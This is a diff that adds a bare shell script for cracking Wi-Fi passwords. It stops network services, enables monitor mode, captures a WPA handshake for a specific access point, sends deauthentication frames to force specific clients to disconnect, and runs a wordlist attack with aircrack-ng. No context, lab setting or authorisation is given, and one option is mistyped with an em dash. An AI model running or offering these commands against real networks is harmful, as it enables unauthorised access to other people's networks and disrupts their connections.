@@ -1,0 +1,11 @@
+sudo killall NetworkManager
+sudo killall NetworkManagerDispatcher
+sudo killall wpa_supplicant
+sudo killall avahi-daemon
+
+airmon-ng start wlo1 9
+airodump-ng -c 9 —bssid 00:14:6C:7E:40:80 -w psk wlo1
+aireplay-ng -0 1 -a 84:74:2A:54:5F:A3 -c 1e:47:51:09:67:62 wlo1
+aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
+
+sudo aireplay-ng -0 5 -q 2 --ig -a 14:60:80:63:3D:30 -c 98:FF:D0:44:85:FE mon0
